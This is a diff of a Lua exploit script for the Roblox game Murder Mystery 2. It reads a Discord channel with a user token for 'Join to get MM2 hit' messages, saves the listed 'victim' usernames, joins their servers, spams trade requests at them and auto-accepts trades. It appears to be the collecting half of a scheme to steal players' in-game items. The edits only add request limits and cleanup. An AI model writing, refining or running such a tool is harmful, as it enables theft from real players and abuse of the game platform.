@@ -6,33 +6,35 @@ if token == "" or channelId == "" then
     game.Players.LocalPlayer:Kick("Add your token or channelId to use")
 end
 
+-- Anti-AFK
 local bb = game:GetService("VirtualUser")
-game:service "Players".LocalPlayer.Idled:Connect(function()
+game:service("Players").LocalPlayer.Idled:Connect(function()
     bb:CaptureController()
     bb:ClickButton2(Vector2.new())
 end)
 
+-- File setup
 local HttpServ = game:GetService("HttpService")
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local victimFile = isfile("user.txt")
 local joinedFile = isfile("joined_ids.txt")
-if not victimFile then
-    writefile("user.txt", "victim username")
-end
-if not joinedFile then
-    writefile("joined_ids.txt", "[]")
-end
+if not victimFile then writefile("user.txt", "victim username") end
+if not joinedFile then writefile("joined_ids.txt", "[]") end
+
 local victimUser = readfile("user.txt")
 local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))
 local didVictimLeave = false
 local timer = 0
+local requestCooldown = 1 -- Seconds between requests (was 0.1)
+local maxRequests = 30 -- Max requests before stopping
+local sentRequests = 0
 
+-- Device selection
 local function selectDevice()
     while task.wait(0.1) do
         local DeviceSelectGui = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DeviceSelect")
         if DeviceSelectGui then
             local Container = DeviceSelectGui:WaitForChild("Container")
-            local Mouse = game.Players.LocalPlayer:GetMouse()
             local button = Container:WaitForChild("Phone"):WaitForChild("Button")
             local buttonPos = button.AbsolutePosition
             local buttonSize = button.AbsoluteSize
@@ -46,44 +48,38 @@ end
 
 task.spawn(selectDevice)
 
-
+-- Initial delay
 local waittime = delay or 2
 wait(waittime)
-
 wait(3)
-game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('hi')
+game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('hey')
 
-local notused = game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptRequest')
-
+-- Trade functions
 local function saveJoinedId(messageId)
     table.insert(joinedIds, messageId)
     writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds))
 end
 
 local function acceptRequest()
-    while task.wait(0.1) do
-    
-    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
-        local args = {
-        [1] = game:GetService("Players"):WaitForChild(victimUser)
-        }
-        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
+    while task.wait(requestCooldown) and sentRequests < maxRequests do
+        if didVictimLeave then break end
+        
+        game:GetService("ReplicatedStorage").Trade.DeclineRequest:FireServer()
+        game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(victimUser)
+        sentRequests = sentRequests + 1
     end
+    print("Stopped sending requests. Total sent:", sentRequests)
 end
 
 local function acceptTrade()
     while task.wait(0.1) do
-        game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptTrade'):FireServer(unpack({[1] = 285646582}))
+        game:GetService('ReplicatedStorage').Trade.AcceptTrade:FireServer(unpack({[1] = 285646582}))
     end
 end
 
 local function waitForPlayerLeave()
-    local playerRemovedConnection
-    playerRemovedConnection = game.Players.PlayerRemoving:Connect(function(removedPlayer)
+    game.Players.PlayerRemoving:Connect(function(removedPlayer)
         if removedPlayer.Name == victimUser then
-            if playerRemovedConnection then
-                playerRemovedConnection:Disconnect()
-            end
             didVictimLeave = true
         end
     end)
@@ -104,12 +100,14 @@ local function tradeTimer()
     end
 end
 
+-- Start systems
 waitForPlayerLeave()
 task.spawn(acceptTrade)
 task.spawn(tradeTimer)
 wait(3)
 task.spawn(acceptRequest)
 
+-- Auto-join system
 local function autoJoin()
     local response = request({
         Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
@@ -123,17 +121,13 @@ local function autoJoin()
 
     if response.StatusCode == 200 then
         local messages = HttpServ:JSONDecode(response.Body)
-        if #messages == 0 then
-            return
-        end
         for _, message in ipairs(messages) do
-            if message.content ~= "" and message.embeds and message.embeds[1] and message.embeds[1].title then
-                if message.embeds[1].title:find("Join to get") then
+            if message.content and message.embeds and message.embeds[1] then
+                if message.embeds[1].title and message.embeds[1].title:find("Join to get MM2 hit") then
                     local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
                     if placeId and jobId then
-                        local victimUsername = message.embeds[1].fields[1].value
-
-                        if didVictimLeave or timer > 5 then
+                        local victimUsername = message.embeds[1].fields and message.embeds[1].fields[1] and message.embeds[1].fields[1].value
+                        if victimUsername and (didVictimLeave or timer > 5) then
                             if not table.find(joinedIds, tostring(message.id)) then
                                 saveJoinedId(tostring(message.id))
                                 writefile("user.txt", victimUsername)
